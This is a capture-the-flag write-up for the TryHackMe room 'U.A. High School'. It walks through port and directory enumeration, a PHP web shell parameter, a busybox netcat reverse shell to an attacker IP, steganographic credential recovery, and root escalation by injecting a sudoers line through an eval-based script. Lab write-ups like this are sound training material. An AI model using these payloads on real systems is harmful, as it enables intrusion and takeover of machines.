---
title: "U.A. High School"
date: 2025-03-04
image: /assets/img/general/CTFgeneral_image.jpg
description: Writeup of the TryHackMe-CTF UA High School
categories: [TryHackMe, Easy]
tags: [linux, rce, steganography]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>U.A. High School</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>Welcome to the web application of U.A., the Superhero Academy.</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/yueiua">https://tryhackme.com/room/yueiua</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge U.A. High School.

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.232.105
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-04 12:58 EST
  Nmap scan report for 10.10.232.105
  Host is up (0.047s latency).
  Not shown: 65533 closed tcp ports (conn-refused)
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http

  Nmap done: 1 IP address (1 host up) scanned in 38.48 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 22,80 10.10.232.105
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-04 13:00 EST
  Nmap scan report for 10.10.232.105
  Host is up (0.041s latency).

  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   3072 58:2f:ec:23:ba:a9:fe:81:8a:8e:2d:d8:91:21:d2:76 (RSA)
  |   256 9d:f2:63:fd:7c:f3:24:62:47:8a:fb:08:b2:29:e2:b4 (ECDSA)
  |_  256 62:d8:f8:c9:60:0f:70:1f:6e:11:ab:a0:33:79:b5:5d (ED25519)
  80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
  |_http-title: U.A. High School
  |_http-server-header: Apache/2.4.41 (Ubuntu)
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 8.09 seconds
```
From here I proceeded the analysis port by port.

## Port 80 Analysis

I began with a Gobuster directory enumeration of the webserver:
```bash
$ gobuster dir --url http://10.10.232.105/ --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,txt,php
	===============================================================
  Gobuster v3.6
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     http://10.10.232.105/
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.6
  [+] Extensions:              html,txt,php
  [+] Timeout:                 10s
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.html                (Status: 403) [Size: 278]
  /index.html           (Status: 200) [Size: 1988]
  /contact.html         (Status: 200) [Size: 2056]
  /about.html           (Status: 200) [Size: 2542]
  /.php                 (Status: 403) [Size: 278]
  /assets               (Status: 301) [Size: 315] [--> http://10.10.232.105/assets/]
  /courses.html         (Status: 200) [Size: 2580]
  /admissions.html      (Status: 200) [Size: 2573]
```

After the scan completed, I initiated another scan within the assets directory:
```bash
$ gobuster dir --url http://10.10.232.105/assets --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,txt,php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.232.105/assets
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 0]
/images               (Status: 301) [Size: 322] [--> http://10.10.232.105/assets/images/]
```

## Shell as www-data

The response size of the `index.php` file caught my attention, so I attempted to enumerate possible parameters using ffuf:
```bash
kali@kali:~/ctf/uahighschool$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://10.10.232.105/assets/index.php?FUZZ=id' -fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.251.140/assets/index.php?FUZZ=id
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

cmd                     [Status: 200, Size: 72, Words: 1, Lines: 1, Duration: 41ms]
```

Fuff found an interesting parameter, which appeared to be a potential PHP shell. I tested it by running the `id` command using Burp Suite:

![RCE](/assets/img/tryhackme/UAHighSchool/thm_uahighschool_1.jpg)

```bash
$ echo "dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK" | base64 -d
	uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

That provided me Remote Code Execution (RCE), so I attempted to gain a reverse shell using busybox and URL-encoded the payload with Burp Suite's Hexavector plugin:
```bash
GET /assets/index.php?cmd=<@urlencode>busybox nc [attackerip] 9001 -e bash</@urlencode>
```

I started a Netcat listener and successfully received the reverse shell. While enumerating the system, I discovered a directory called `Hidden_Content`, which contained a file named passphrase:
```bash
www-data@myheroacademia:/var/www$ ls
  Hidden_Content  html
www-data@myheroacademia:/var/www$ cd Hidden_Content/
www-data@myheroacademia:/var/www/Hidden_Content$ ls
  passphrase.txt
www-data@myheroacademia:/var/www/Hidden_Content$ cat passphrase.txt 
  Q[removed]=
www-data@myheroacademia:/var/www/Hidden_Content$ cat passphrase.txt | base64 -d
  A[removed]!
```

## Privilege Escalation deku

With the passphrase, I wasn't able to switch to user `deku`. Continuing my enumeration, I found two `jpg` images in the `images` directory:
```bash
www-data@myheroacademia:/var/www/html/assets/images$ ls
  oneforall.jpg  yuei.jpg
```

Upon analyzing the images, I noticed that the magic numbers of `oneforall.jpg` where corrupted:
```bash
$ xxd oneforall.jpg | head                                               
00000000: 8950 4e47 0d0a 1a0a 0000 0001 0100 0001  .PNG............
00000010: 0001 0000 ffdb 0043 0006 0405 0605 0406  .......C........
00000020: 0605 0607 0706 080a 100a 0a09 090a 140e  ................
```

After correcting it using `hexedit`, the magic numbers matched the `jpg` extension:
```bash
00000000: ffd8 ffe0 0010 4a46 4946 0001 0101 0048  ......JFIF.....H
00000010: 0001 0000 ffdb 0043 0006 0405 0605 0406  .......C........
00000020: 0605 0607 0706 080a 100a 0a09 090a 140e  ................
```

I then attempted to extract hidden data using `steghide`. Initially, I found nothing when using no password, but after trying the passphrase I had discovered earlier, `steghide` successfully extracted a `creds.txt` file:
```bash
kali@kali:~/ctf/uahighschool$ cat creds.txt            
  Hi Deku, this is the only way I've found to give you your account credentials, as soon as you have them, delete this file:

  deku:O[removed]A
```

Using the credentials, I was able to switch to the `deku` user and retrieve the user flag:
```bash
deku@myheroacademia:~$ cat user.txt 
  THM{W[removed]?}
```

## Privilege Escalation root

I continued by running `sudo -l` and received the following output:
```bash
deku@myheroacademia:~$ sudo -l
[sudo] password for deku: 
Matching Defaults entries for deku on myheroacademia:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh
```

A Bash script in the output seemed interesting, so analyzed it:
```bash
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."

echo "Enter your feedback:"
read feedback


if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input." 
fi
```

The use of the `eval` command stood out, as it was echoing the input I provided. I was able to exploit this by injecting the following input:
```bash
deku@myheroacademia:~$ sudo /opt/NewComponent/feedback.sh 
  Hello, Welcome to the Report Form       
  This is a way to report various problems
      Developed by                        
          The Technical Department of U.A.
  Enter your feedback:
  deku ALL=NOPASSWD: ALL >> /etc/sudoers
  It is This:
  Feedback successfully saved.
```

After executing this, the `deku` user got added to the list of root users:
```bash
deku@myheroacademia:~$ sudo -l
  Matching Defaults entries for deku on myheroacademia:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

  User deku may run the following commands on myheroacademia:
      (ALL) /opt/NewComponent/feedback.sh
      (root) NOPASSWD: ALL
```

With this, I was able to switch to root user and retrieve the root flag:
```bash 
deku@myheroacademia:~$ sudo su
root@myheroacademia:/opt/NewComponent# cat /root/root.txt
__   __               _               _   _                 _____ _          
\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
 \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
                                  _    _ 
             _   _        ___    | |  | |
            | \ | | ___  /   |   | |__| | ___ _ __  ___
            |  \| |/ _ \/_/| |   |  __  |/ _ \ '__|/ _ \
            | |\  | (_)  __| |_  | |  | |  __/ |  | (_) |
            |_| \_|\___/|______| |_|  |_|\___|_|   \___/ 

THM{Y[removed]0}
```

solved! :)